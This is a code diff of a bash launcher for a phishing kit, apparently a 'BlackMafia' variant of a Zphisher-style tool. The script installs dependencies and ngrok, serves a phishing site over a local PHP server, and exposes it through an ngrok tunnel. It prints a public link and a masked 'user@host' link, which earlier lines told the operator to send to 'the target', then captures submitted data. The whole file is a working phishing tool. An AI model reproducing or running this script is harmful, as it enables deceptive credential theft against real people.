@@ -1,3 +1,4 @@
+#!/bin/bash
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
@@ -38,15 +39,15 @@ reset_color() {
 }
 
 ## Kill already running process
+## Kill already running process
 Black_Mafia() {
 	if [[ `pidof php` ]]; then
 		killall php > /dev/null 2>&1
 	fi
-	if [[ `pidof ngrok` || `pidof ngrok2` ]]; then
-		killall ngrok > /dev/null 2>&1 || killall ngrok2 > /dev/null 2>&1
+	if [[ `pidof ngrok` ]]; then
+		killall ngrok > /dev/null 2>&1
 	fi	
 }
-
 ## Banner
 banner() {
 	cat <<- EOF
@@ -82,25 +83,25 @@ ${ORANGE} ███████████████████████�
 ## Dependencies
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
-        echo ""
-        echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m⛔ Ngrok  Installation  ⛔ \e[0m'
-        sleep 3
-        clear
-        echo ""
-        echo ""
-        echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
-        echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  ⛔         DOWNLOAD REQUIREMENTS         ⛔\e[0m'
-        echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
-        echo ""
-        if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
+
+    if [[ -d "/data/data/com.termux/files/home" ]]; then
+        if [[ `command -v proot` ]]; then
+            printf ''
+        else
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+            pkg install proot resolv-conf -y
+        fi
+    fi
+
+	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
 	else
 		pkgs=(php curl wget unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing packages : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ `command -v pkg` ]]; then
-					pkg install "$pkg"
+					pkg install "$pkg" -y
 				elif [[ `command -v apt` ]]; then
 					apt install "$pkg" -y
 				elif [[ `command -v apt-get` ]]; then
@@ -116,8 +117,8 @@ dependencies() {
 			}
 		done
 	fi
-}
 
+}
 ## Download Ngrok
 download_ngrok() {
 	url="$1"
@@ -128,48 +129,32 @@ download_ngrok() {
 	wget --no-check-certificate "$url" > /dev/null 2>&1
 	if [[ -e "$file" ]]; then
 		unzip "$file" > /dev/null 2>&1
-		mv -f ngrok .server/"$2" > /dev/null 2>&1
+		mv -f ngrok .server/ngrok > /dev/null 2>&1
 		rm -rf "$file" > /dev/null 2>&1
-		chmod +x .server/"$2" > /dev/null 2>&1
+		chmod +x .server/ngrok > /dev/null 2>&1
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
 		{ reset_color; exit 1; }
 	fi
 }
-
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} BlackMafia Installing..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip' 'ngrok'
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip' 'ngrok'
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip' 'ngrok'
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
 		else
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip' 'ngrok'
+			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
 		fi
 	fi
 
-	if [[ -e ".server/ngrok2" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok patch already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} BlackMafia Server Installing..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_ngrok 'https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip' 'ngrok2'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip' 'ngrok2'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/a/kpRGfBMYeTx/ngrok-2.2.8-linux-amd64.zip' 'ngrok2'
-		else
-			download_ngrok 'https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip' 'ngrok2'
-		fi
-	fi
 }
 
 ## Exit message
@@ -257,15 +242,21 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} BlackMafia server... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} $2"
-	sleep 2 && ./.server/"$1" http "$HOST":"$PORT" > /dev/null 2>&1 &
-	{ sleep 8; clear; banner_mafia; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & 
+    else
+        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+    fi
+
+	{ sleep 8; clear; banner_small; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Send This link To The Target Orignal link: ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Send This link To The Target Edit link: ${GREEN}$mafia404@$ngrok_url1"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
 	capture_data
 }
 
